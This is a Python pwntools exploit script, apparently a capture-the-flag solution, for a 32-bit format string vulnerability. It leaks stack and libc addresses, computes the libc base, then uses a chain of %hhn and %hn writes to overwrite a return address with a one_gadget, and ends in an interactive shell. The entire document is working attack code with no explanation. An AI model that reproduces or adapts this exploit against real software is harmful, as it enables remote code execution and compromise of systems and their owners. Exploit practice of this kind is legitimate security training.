from parse_args_and_some_func import *

sh = all_parsed_args['io']
cur_elf = all_parsed_args['cur_elf']

if all_parsed_args["debug_enable"]:
    gadgets = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]
    libc = sh.elf.libc
else:
    gadgets = [0x3a80c, 0x3a80e, 0x3a812, 0x3a919, 0x5f065, 0x5f066]
    libc = ELF("/root/LibcSearcher/libc-database/other_libc_so/libc_32-2.23.so")

context.arch="i386"

sh.recvlines(3)
sh.sendline("%6$p,%19$p")
msg = sh.recvline()

stack_addr, libc_addr = msg[:-1].split(b",")
stack_addr = int16(stack_addr.decode())
libc_addr = int16(libc_addr.decode())

LOG_ADDR("stack_addr", stack_addr)
LOG_ADDR("libc_addr", libc_addr)

libc.address = libc_addr - 247 - libc.sym['__libc_start_main']
LOG_ADDR("libc_base_addr", libc.address)

one_gadget = libc.offset_to_vaddr(gadgets[0])

low_1_b = stack_addr & 0xff

payload = "%{}c%6$hhn".format(low_1_b + 4).ljust(0x18, "a")
sh.sendline(payload)
sh.recv()
sleep(3)

payload = "%{}c%10$hn".format(one_gadget & 0xffff).ljust(0x18, "a")
sh.sendline(payload)
sh.recv()
sleep(3)

payload = "%{}c%6$hhn".format(low_1_b + 4 + 2).ljust(0x10, "a")
sh.sendline(payload)
sh.recv()
sleep(3)

payload = "%{}c%10$hn".format((one_gadget >> 16) & 0xffff).ljust(0x18, "a")
sh.sendline(payload)
sh.recv()
sleep(3)

payload = "%{}c%6$hhn".format(low_1_b + 0x10).ljust(0x18, "a")
sh.sendline(payload)
sh.recv()
sleep(3)

sh.sendline("quit")

sh.interactive()
